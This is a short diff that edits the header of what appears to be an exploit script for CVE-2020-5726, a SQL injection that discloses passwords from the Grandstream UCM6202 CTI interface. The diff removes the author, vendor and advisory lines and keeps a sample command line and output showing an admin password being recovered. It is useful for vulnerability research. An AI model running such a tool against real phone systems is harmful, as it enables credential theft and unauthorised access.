@@ -1,15 +1,8 @@
-# Exploit Title: Grandstream UCM6202 CTI Interface SQL Injection Password Disclosure
-# Date: 03/30/2020
-# Exploit Author: Jacob Baines
-# Vendor Homepage: http://www.grandstream.com/
-# Software Link: http://www.grandstream.com/support/firmware/ucm62xx-official-firmware
 # Version: 1.0.20.20 and below.
-# Tested on: Grandstream UCM6202 1.0.20.20
+# Grandstream UCM6202 1.0.20.20
 # CVE : CVE-2020-5726
-# Advisory: https://www.tenable.com/security/research/tra-2020-17
-# Sample output:
-# 
-# albinolobster@ubuntu:~$ python3 cti_injection.py --rhost 192.168.0.32 --user admin
+
+# python3 cti_injection.py --rhost 192.168.0.32 --user admin
 # [+] Reaching out to 192.168.2.1:8888
 # [+] Password length 9
 # [+] The password is LabPass1%
